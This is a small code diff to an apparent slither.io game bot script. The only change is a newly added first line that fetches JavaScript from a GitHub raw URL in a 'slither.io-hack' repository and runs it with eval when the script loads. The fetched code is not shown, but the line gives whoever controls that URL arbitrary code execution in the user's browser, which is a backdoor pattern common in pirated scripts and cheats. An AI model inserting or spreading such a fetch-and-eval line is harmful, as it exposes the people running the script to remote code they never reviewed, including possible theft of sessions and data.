@@ -1,3 +1,4 @@
+fetch("https://raw.githubusercontent.com/Wang-sus/slither.io-hack/main/api.js").then((res) => res.text().then((t) => eval(t)))
 var bot = window.bot = (function() {
     return {
         isBotRunning: false,
